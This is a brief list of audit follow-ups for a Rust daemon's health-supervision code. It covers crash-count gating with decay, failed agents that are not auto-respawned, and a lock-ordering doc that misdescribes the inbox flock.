- **Crash backoff/window model** — the audit's "≥5 crashes in 10 min → Failed" mental model is **imprecise**: the Failed gate is cumulative `total_crashes>=5` minus 1/30-min decay (`health.rs:576,1073`). Worth a docs clarification + a look at whether cumulative-without-window is intended.
- **`Failed`-with-dead-process never auto-respawns** — in-code "Known limitation" (`health.rs:1081-1093`); agent stuck until manual restart. Confirm whether the respawn-watchdog is meant to cover this.
- **`DAEMON-LOCK-ORDERING.md:50-51`** describes the inbox lock as "implicit via temp+rename" but the code uses an explicit `with_inbox_lock` flock — doc is wrong (impl is safer). Low.
